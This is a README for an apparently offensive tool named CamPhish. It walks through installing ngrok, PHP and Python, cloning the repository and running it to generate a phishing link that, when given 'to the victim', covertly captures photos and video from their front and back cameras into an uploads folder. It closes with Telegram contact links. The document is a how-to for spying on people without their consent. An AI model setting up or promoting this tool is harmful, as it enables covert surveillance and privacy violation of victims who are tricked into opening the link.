#MrEsfelurmge to take pictures from the front and back camera

This program requires php, ngrok and python! 
Please install these prerequisites before running

# requires

- Install Ngrok
  
  - Widnows: https://ngrok.com/download/windows
  - Linux: https://ngrok.com/download/linux
  - Termux: https://github.com/Yisus7u7/termux-ngrok
 
- Install php

  - Windows: https://www.php.net/downloads.php
  - Linux: sudo apt install php
  - Termux: pkg install php
 
- Install Python (py)

  - Windows: <a href="https://www.python.org/downloads/release/python-3120/">Download
  - Linux: sudo apt install python
  - Termux: pkg install python
 

# ScreenShot

<img src="https://github.com/user-attachments/assets/957246ed-f465-4a08-bb98-30f9f07c5870">


After installing ngrok, enter the site and register, get your token and enter the token with this command:
`ngrok config add-authtoken <token>`

Now run the program:

```
git clone https://github.com/Mr-Spect3r/CamPhish
cd CamPhish
python main.py
```

If you are running it for the first time, you must enter your ngrok token

Now, if you like, you can change the index.html file, for example, take a few photos from the back or front camera or record a few seconds of video.

Now, if you have done all the steps correctly, the program will give you a link, give that link to the victim so that you can take photos and videos from it!

Photos are saved in the uploads folder! If you are in termux, use this command to transfer the photos to your gallery: 
`cp -r uploads /sdcard`

My Telegram: https://t.me/MrEsfelurm
https://t.me/esfelorm
https://t.me/TmCroc

Vip tools: https://github.com/Mr-Spect3r/My-Tools
